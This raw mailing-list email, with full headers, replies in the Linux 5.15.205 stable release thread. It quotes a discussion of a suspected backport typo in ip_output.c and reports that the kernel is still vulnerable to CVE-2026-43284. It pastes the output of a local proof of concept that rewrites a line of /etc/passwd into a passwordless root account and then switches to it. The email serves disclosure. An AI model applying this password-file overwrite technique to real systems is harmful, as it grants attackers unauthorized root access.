Return-Path: <stable+bounces-244756-lists+stable=lfdr.de@vger.kernel.org>
Delivered-To: lists+stable@lfdr.de
Received: from mail.lfdr.de
	by lfdr with LMTP
	id 6Id9Jkzi/WlvkQAAu9opvQ
	(envelope-from <stable+bounces-244756-lists+stable=lfdr.de@vger.kernel.org>)
	for <lists+stable@lfdr.de>; Fri, 08 May 2026 15:17:00 +0200
X-Original-To: lists+stable@lfdr.de
Received: from sea.lore.kernel.org (sea.lore.kernel.org [172.234.253.10])
	by mail.lfdr.de (Postfix) with ESMTPS id 763D54F6E2A
	for <lists+stable@lfdr.de>; Fri, 08 May 2026 15:16:58 +0200 (CEST)
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by sea.lore.kernel.org (Postfix) with ESMTP id 5B54F3069619
	for <lists+stable@lfdr.de>; Fri,  8 May 2026 13:14:06 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 53A283E276E;
	Fri,  8 May 2026 13:14:05 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="NRQv1tI5"
X-Original-To: stable@vger.kernel.org
Received: from mail-ej1-f53.google.com (mail-ej1-f53.google.com [209.85.218.53])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id C95F33E276A
	for <stable@vger.kernel.org>; Fri,  8 May 2026 13:14:03 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.218.53
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1778246045; cv=pass; b=sbeG5XbPFXs3qwaN0lEzJvnpskAF5aHprNc4kt12pAor4NbXtRniukC2Oo6UII2ms0eGw9RxdBkmCy8lQ4ojLoCByozN/K2HyesEqQjQrQIef/p/DpsNLfp3fAiZ339X1AQeXhyDbgUXw0p56fm8jqgzpH6PpUEZqjXOqyit+OM=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1778246045; c=relaxed/simple;
	bh=ucDmkROr1n3Z9ZBGP4CfHPs6GWdRZLf3dD9ce77GUd0=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=LzAbJM7mcxVCfBz9rWS0H2zcsK6JqQ2seqykzGlcKV05I2gDSKFZLP3uBRpiJoRCaDLfB1iRFXI9m4P9+Bu2gvMXr8FIoX5RYjanemRI8kWd4Kg4cjHrfM5VmmHcoe1lkTNuND5ZTAyXysG8NSHfXZrOI3c4ER8rGg8tIOiglX0=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=NRQv1tI5; arc=pass smtp.client-ip=209.85.218.53
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Received: by mail-ej1-f53.google.com with SMTP id a640c23a62f3a-bc47a96d3bbso271048366b.3
        for <stable@vger.kernel.org>; Fri, 08 May 2026 06:14:03 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1778246042; cv=none;
        d=google.com; s=arc-20240605;
        b=AI8CuhCMfEHzQmGDgvHuPEEvk7PhZYbl6RUpRaLszfdoZ6p9C8iX8cAHa0a2JrOLWM
         /qHJff3JBSdfDn5rCQwGXU3BLlTxMrrBnqZUWwy0RSZjVnEQ/+DIa21BA+eVtH0Lnjn+
         WDDtUfwXJJhp4w1F4zn8AbaJiNKzk6ssUhJN5R7ql6bX3WP4vMyeyc2nnJlx80VVlYas
         xpesAZeZuCGvHW7RDjvZVajcPlgPUANaGd5Ho1talde3H1t8uTeRn6AV/K/CvPLXVF8g
         2OKRNWGEesB2V+iPgqvwaa4dMc4XFciUUnYVy+1fLBpg3fGokLpMG0OAJeKv3/uT7YFS
         SZ0Q==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:dkim-signature;
        bh=ucDmkROr1n3Z9ZBGP4CfHPs6GWdRZLf3dD9ce77GUd0=;
        fh=b7Il9sOa2HsgxGncfC7ISLOMKvnHjc9xr3XMU2j/ohw=;
        b=hhpCxP8o4ZJS5BRFGkssUzwlVKUAm+yfPezXyzmADkHs2jiwVovcS/l3o3GWlTEf4A
         msYfpFeV759eYNzAhj0mXU2wc1+zOKHaXiZDBJX9LWiN+ChCKwPR/SQS1lAMHD5SiVf6
         3qtFGvGdeAvzYEbRrPzbw21Ia6Yo4frprwJNkvCxvVKA94VLsnLGtLO4zJQq5rmkJY4R
         yC+dJkhsSPN0IE39q6d7tAril6xtgL01ZKx3zgEslcYgi5msnFEVEHnXfjVflVegavVw
         Ets4CiBUWSnxa9D5HF7lhH9sFt9ra2yAExOZt4gkvbx8bPh8bVx6wUGudSTkY6Dked3j
         JAzg==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1778246042; x=1778850842; darn=vger.kernel.org;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:from:to:cc:subject:date
         :message-id:reply-to;
        bh=ucDmkROr1n3Z9ZBGP4CfHPs6GWdRZLf3dD9ce77GUd0=;
        b=NRQv1tI5RZs5Wwxsx4lyeCPm4uxS2hENTE2/mlafgCjNVTz6tdyxl//3EnGc30VpPn
         kjOBu8hr9WbceIHN3uWsHZuEzYbVB3QmUwEy1tF7RnaOBcw6LeGLmqUss7TJ1aAjqXA/
         XhsmmsEqZ6id7JAj/dhYGxXCDKrBS4jn5KU6eWBX3RSOoRF3w/wc25V5zwvCh/Ic6awc
         EGBYObW8jx9IyCC73FM4k4FpCznf/sv/yHh/R32zTIYAiLAUHbI3hTINqJj1yFPfevVY
         v6Xu0LTrFEklmnCQSjymZUxzpNP1Vfkjs/nHp1N5xrXjyFtJAqhOvr+0LqWmw71iBYTt
         ANPw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1778246042; x=1778850842;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:x-gm-gg:x-gm-message-state:from
         :to:cc:subject:date:message-id:reply-to;
        bh=ucDmkROr1n3Z9ZBGP4CfHPs6GWdRZLf3dD9ce77GUd0=;
        b=QRu0bZ+m2IkHQc8JfsKWE/MzSh7gXadp4eZY8C+w12lIbyhbXV1HaDPN110zSQ6zGj
         b5Fo77gjj2aP/KcihQu9WtmnR2E0LRn1kUjM5MB8Es7NnlpnBY1/6ZC7SZAinvWTpECI
         FEeOe6wBU49tkBuxIt47VT6obVPZpq3l2MVi/MAzEwxuWyDBycMfiHX9LgY8FN5qav9N
         hPt6TZB3mAhwK3CA+tl/Aok25YO0hq5zlZBwzknGvbmk7A0uENvkQurHmkdDg5ndYYOi
         9SLAHmQN32T2ZEoCUwuP1e+hWfWbIdmM0i/EY2vhHOETfnCSjrHnGYIRd74cXXuWubdH
         s3sg==
X-Forwarded-Encrypted: i=1; AFNElJ9g5cFWVYsE7cTcRHd68MMPkiTvZW7DbzgXaxGDhzzk0rWF+8npNI/veo1QpftGaVHwCFwP2PY=@vger.kernel.org
X-Gm-Message-State: AOJu0YypJ+icdsCSlyud+znC3oOBBEFxk/DV1VfjO5JTL4u8zOmPKyuX
	EfvEm0MVHp2yEo/YpNMvKnfp2fpc9A6Z6xsR8VVlxx+YVlINpbdpdd5HxB8Mjcc3q2hUpf2LEuZ
	YC35z2mk5TF/D6o5sEcqBSpys4qrSnCk=
X-Gm-Gg: AeBDieu1OA390sSHneTTNbv51Z/Cvzogyhp8ex2fVeQ1f5DbKi3KrXne5ImQ9T/9M+Y
	pnypTourpfMFfLn+6es8HynqqMWpF661qxk3VL3MYNuh4qkelDP0pZDpiEavokFkqPG9+uM51V8
	0cghsK7lCps5fmq+O4rkFgK8GGGAO+7XpXiYR0+QC9C2YCrxT5LY3ovn5120gAurmuhJbix0roo
	bv+s6GBgDqUumS/8o71AMn3nUzNeJlGUbqkwgGlCl37iRnQqHzwK0OaQCPws5t3RggKvgMUIwqK
	vRHtxqzVHC38KSMi9Tt7e4G0ltc=
X-Received: by 2002:a17:907:d0b:b0:ba5:60e1:2ef2 with SMTP id
 a640c23a62f3a-bc56cd3a5e2mr790565966b.22.1778246042024; Fri, 08 May 2026
 06:14:02 -0700 (PDT)
Precedence: bulk
X-Mailing-List: stable@vger.kernel.org
List-Id: <stable.vger.kernel.org>
List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
References: <2026050835-appealing-stallion-a207@gregkh> <1b941a1353791ddd6fd75fb8e68b377367d689ff.camel@oracle.com>
 <2026050829-gladiator-displease-57af@gregkh>
In-Reply-To: <2026050829-gladiator-displease-57af@gregkh>
From: Massimiliano Pellizzer <mpellizzer.dev@gmail.com>
Date: Fri, 8 May 2026 15:13:51 +0200
X-Gm-Features: AVHnY4K2_8uAlyzf-dBI4QXmg_PMLmf09Cn6MrGchVEacRZ58es7B1XercfZlio
Message-ID: <CALUEkOdFEFJ_U1va62B=tWspd2YfLJ-qk72r380wrLRGYfYKPg@mail.gmail.com>
Subject: Re: Linux 5.15.205
To: "gregkh@linuxfoundation.org" <gregkh@linuxfoundation.org>
Cc: Dominik Grzegorzek <dominik.grzegorzek@oracle.com>, Ben Hutchings <benh@debian.org>, 
	"torvalds@linux-foundation.org" <torvalds@linux-foundation.org>, "lwn@lwn.net" <lwn@lwn.net>, 
	"stable@vger.kernel.org" <stable@vger.kernel.org>, 
	"linux-kernel@vger.kernel.org" <linux-kernel@vger.kernel.org>, 
	"akpm@linux-foundation.org" <akpm@linux-foundation.org>, "jslaby@suse.cz" <jslaby@suse.cz>
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable
X-Rspamd-Queue-Id: 763D54F6E2A
X-Rspamd-Server: lfdr
X-Spamd-Result: default: False [-2.16 / 15.00];
	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=2];
	DMARC_POLICY_ALLOW(-0.50)[gmail.com,none];
	R_DKIM_ALLOW(-0.20)[gmail.com:s=20251104];
	R_SPF_ALLOW(-0.20)[+ip4:172.234.253.10:c];
	MAILLIST(-0.15)[generic];
	MIME_GOOD(-0.10)[text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	RCVD_TLS_LAST(0.00)[];
	TAGGED_FROM(0.00)[bounces-244756-lists,stable=lfdr.de];
	FROM_HAS_DN(0.00)[];
	TO_DN_EQ_ADDR_SOME(0.00)[];
	MIME_TRACE(0.00)[0:+];
	RCVD_COUNT_THREE(0.00)[4];
	FREEMAIL_FROM(0.00)[gmail.com];
	TO_DN_SOME(0.00)[];
	DKIM_TRACE(0.00)[gmail.com:+];
	MISSING_XM_UA(0.00)[];
	FORGED_SENDER_MAILLIST(0.00)[];
	NEURAL_HAM(-0.00)[-1.000];
	PRECEDENCE_BULK(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[mpellizzerdev@gmail.com,stable@vger.kernel.org];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	MID_RHS_MATCH_FROMTLD(0.00)[];
	TAGGED_RCPT(0.00)[stable];
	RCPT_COUNT_SEVEN(0.00)[9];
	ASN(0.00)[asn:63949, ipnet:172.234.224.0/19, country:SG];
	DBL_BLOCKED_OPENRESOLVER(0.00)[sea.lore.kernel.org:helo,sea.lore.kernel.org:rdns,mail.gmail.com:mid,linuxfoundation.org:email]
X-Rspamd-Action: no action

On Fri, May 8, 2026 at 2:44=E2=80=AFPM gregkh@linuxfoundation.org
<gregkh@linuxfoundation.org> wrote:
>
> On Fri, May 08, 2026 at 12:05:02PM +0000, Dominik Grzegorzek wrote:
> > Hi,
> >
> > I may be mistaken, but I think there might be a small typo in this hunk=
 in net/ipv4/ip_output.c:
> >
> > skb_shinfo(skb)->tx_flags |=3D SKBFL_SHARED_FRAG;
> >
> > Would this need to be:
> >
> > skb_shinfo(skb)->flags |=3D SKBFL_SHARED_FRAG;
> >
> > My understanding is that SKBFL_SHARED_FRAG is a bit in skb_shared_info-=
>flags, and skb_has_shared_frag() checks skb_shinfo(skb)->flags.
>
> Adding Ben who did the 5.10 backport so he can comment on this.
>
> thanks,
>
> greg k-h
>

Hi,

The new released kernel 5.15.205 is still vulnerable to CVE-2026-43284.

```
$ ./run.sh
=3D=3D=3D Stage 1 =E2=80=94 overwrite 'systemd-timesync' line (89 bytes) wi=
th
'sick::0:0:<pad>:/:/bin/bash'
=3D=3D=3D Stage 2 =E2=80=94 verify
sick::0:0:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX=
XX:/:/bin/bash
=3D=3D=3D Stage 3 =E2=80=94 su - sick (empty password via PAM nullok)
[i] state saved to /var/tmp/.cf2.state =E2=80=94 run './run.sh --clean' to =
revert
# uname -r
5.15.205
```

